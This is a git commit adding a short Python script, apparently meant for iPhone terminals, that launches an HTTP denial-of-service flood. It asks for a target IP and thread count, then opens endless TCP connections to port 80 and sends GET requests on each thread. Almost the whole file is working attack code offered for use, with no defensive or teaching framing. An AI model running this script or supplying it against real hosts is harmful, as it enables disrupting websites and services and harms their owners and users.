16efff40a34182f89d76a84dd0c32e05ffb3da50
V1 MoDzZz <67358940+V1MoDzZz@users.noreply.github.com>
2020-11-23 06:13:57 +0500

    httpdos4iphone.py
    Requirements:
    
    Libterm
    
    Python3

---
+++ httpdos4iphone.py
@@ -0,0 +1,35 @@
+
+import socket
+import threading
+import sys
+
+sys.ps1 = '\033[01;32m '
+print(sys.ps1)
+print('''
+
+ ####### ######   #####   #####  
+    #    #     # #     # #     # 
+    #    #     #       #       # 
+    #    ######   #####   #####  
+    #    #   #         #       # 
+    #    #    #  #     # #     # 
+    #    #     #  #####   #####  
+                                 
+
+''')
+
+target = input("Enter the IP of the Target: ")
+thr = input("How many Threads do ya wanna create?: ")
+port = 80
+
+def attack():
+    while True:
+        lol = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        lol.connect((target, port))
+        lol.sendto(("GET /{target} HTTP/1.1\r\n").encode("ascii"), (target, port))
+        lol.close()
+print("Attack started on "+target)
+    
+for i in range(int(thr)):
+    thread1 = threading.Thread(target=attack)
+    thread1.start()
